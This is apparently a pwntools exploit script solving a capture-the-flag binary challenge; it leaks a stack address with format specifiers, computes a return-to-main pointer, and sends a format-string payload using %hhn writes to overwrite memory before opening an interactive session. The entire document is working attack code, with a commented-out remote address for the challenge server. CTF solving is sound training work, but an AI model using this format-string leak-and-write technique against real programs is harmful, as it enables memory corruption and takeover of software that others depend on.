#!/usr/bin/python3
from pwn import *

#elf = context.binary = ELF("chall_patched")

gdbscript = '''
b *$rebase(0x159c)
b *$rebase(0x152a)
c
'''

io = gdb.debug("./original_chall", gdbscript=gdbscript)
#io = process("./original_chall")
#io = remote("34.42.147.172",4003)

# Christmas function has 1 byte overflow
io.sendlineafter(b"(gift/flag)", b"%"*9)
io.recvline()
leak = io.recvline()[:14]

leak = int(leak, 16)
log.info(f"{leak = :#x}")

ret_to_main_ptr = leak + 0x90
log.info(f"{ret_to_main_ptr = :#x}")

dup_ptr = leak + 0x124
stdout = 0x1

stage_1 = f"%42c%10$hhn%216c%11$hhn".encode().ljust(0x20,b'\x00') + p64(ret_to_main_ptr) + p64(dup_ptr)

io.send(stage_1)

io.interactive()
